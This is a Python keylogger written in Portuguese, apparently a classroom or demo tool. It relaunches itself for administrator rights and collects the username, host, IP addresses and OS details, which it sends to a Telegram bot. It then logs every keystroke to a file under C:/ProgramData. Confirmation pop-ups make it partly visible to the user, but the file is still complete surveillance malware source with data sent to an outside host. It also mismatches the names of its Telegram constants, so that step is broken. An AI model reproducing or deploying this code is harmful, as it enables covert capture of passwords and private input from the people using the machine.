import os
import sys
import socket
import requests
import ctypes
import psutil
import keyboard
from tkinter import messagebox, Tk, Button, Label

# Configuração do Telegram
TOKEN_TELEGRAM = "<SEU_TOKEN_TELEGRAM>"
ID_CHAT_TELEGRAM = "<SEU_ID_TELEGRAM>"

def obter_detalhes_sistema():
    """
    Coleta detalhes do sistema, como IPs, sistema operacional e usuário atual.
    """
    try:
        hostname = socket.gethostname()
        usuario = os.getlogin()
        sistema = f"{os.name} ({sys.platform})"
        ips = [addr.address for iface, addrs in psutil.net_if_addrs().items() for addr in addrs if addr.family == socket.AF_INET]
        privilegios = "Concedidos ✅" if verificar_admin() else "Não Concedidos ❌"
        detalhes = (
            f"=== DETALHES DO SISTEMA ===\n"
            f"👤 Usuário: {usuario}\n"
            f"💻 Host: {hostname}\n"
            f"🌐 IPs: {' | '.join(ips)}\n"
            f"🖥️ Sistema Operacional: {sistema}\n"
            f"🔐 Privilégios Administrativos: {privilegios}\n"
        )
        return detalhes
    except Exception as e:
        return f"Erro ao coletar detalhes do sistema: {e}"

def enviar_alerta_arquivo(nome_arquivo):
    """
    Envia alerta ao Telegram sobre a execução do arquivo.
    """
    pasta_atual = os.path.dirname(os.path.abspath(nome_arquivo))
    detalhes_sistema = obter_detalhes_sistema()
    mensagem = (
        f"🔴 <b>ALERTA CRÍTICO: Keylogger '{nome_arquivo}' foi ativado!</b>\n"
        f"📂 <b>Localização:</b> {pasta_atual}\n"
        f"{detalhes_sistema}"
    )
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": mensagem, "parse_mode": "HTML"}
        requests.post(url, data=payload)
        print(f"Alerta enviado ao Telegram: {mensagem}")
    except Exception as e:
        print(f"Erro ao enviar alerta ao Telegram: {e}")

def verificar_admin():
    """
    Verifica se o script está sendo executado como administrador.
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        print(f"Erro ao verificar privilégios: {e}")
        return False

def escalar_privilegios():
    """
    Escala privilégios para administrador caso necessário.
    """
    if not verificar_admin():
        print("Tentando escalar privilégios...")
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, __file__, None, 1
            )
            os._exit(0)
        except Exception as e:
            print(f"Erro ao tentar escalar privilégios: {e}")
            os._exit(1)

def exibir_popup(txt_correspondente):
    """
    Exibe um pop-up perguntando se o arquivo explicativo foi lido.
    """
    root = Tk()
    root.withdraw()

    while True:
        resposta = messagebox.askquestion(
            "Confirmação Necessária",
            f"Você leu o arquivo explicativo '{txt_correspondente}'?\n\n"
            "Por favor, leia antes de continuar."
        )

        if resposta.lower() in ["yes", "sim"]:
            messagebox.showinfo("Confirmado", "Obrigado por confirmar.")
            return True
        else:
            messagebox.showwarning("Leitura Necessária", "Por favor, leia o arquivo antes de continuar.")

def exibir_popup_informativo(caminho_pasta):
    """
    Exibe um pop-up informativo com botão para copiar o caminho da pasta.
    """
    def copiar_caminho():
        root.clipboard_clear()
        root.clipboard_append(caminho_pasta)
        root.update()
        messagebox.showinfo("Caminho Copiado", "O caminho foi copiado para a área de transferência. Cole no Explorador de Arquivos para acessar o log.")

    root = Tk()
    root.title("Keylogger Finalizado")
    root.geometry("400x200")
    root.resizable(False, False)

    Label(root, text="O Keylogger foi encerrado.", font=("Arial", 12)).pack(pady=10)
    Label(root, text=f"O log foi salvo na pasta abaixo:", font=("Arial", 10)).pack(pady=5)
    Label(root, text=caminho_pasta, font=("Arial", 9), fg="blue").pack(pady=5)

    Button(root, text="Copiar Caminho", command=copiar_caminho, font=("Arial", 10)).pack(pady=20)

    root.mainloop()

def registrar_teclas():
    """
    Registra as teclas pressionadas e salva em um arquivo de log.
    """
    caminho_logs = "C:/ProgramData/keylogger_senai/"
    os.makedirs(caminho_logs, exist_ok=True)
    arquivo_log = os.path.join(caminho_logs, "teclas_registradas.txt")

    print("Keylogger ativo. (Pressione ESC para encerrar)")
    with open(arquivo_log, "w") as f:
        while True:
            evento = keyboard.read_event()
            if evento.event_type == keyboard.KEY_DOWN:
                tecla = evento.name
                f.write(f"{tecla}\n")
                f.flush()
            if evento.name == "esc":
                print("Keylogger encerrado.")
                exibir_popup_informativo(caminho_logs)
                break

if __name__ == "__main__":
    escalar_privilegios()

    nome_arquivo = os.path.basename(sys.argv[0])
    txt_correspondente = f"{os.path.splitext(nome_arquivo)[0]}.txt"

    if exibir_popup(txt_correspondente):
        print("Processo confirmado pelo usuário.")
        enviar_alerta_arquivo(nome_arquivo)
        registrar_teclas()
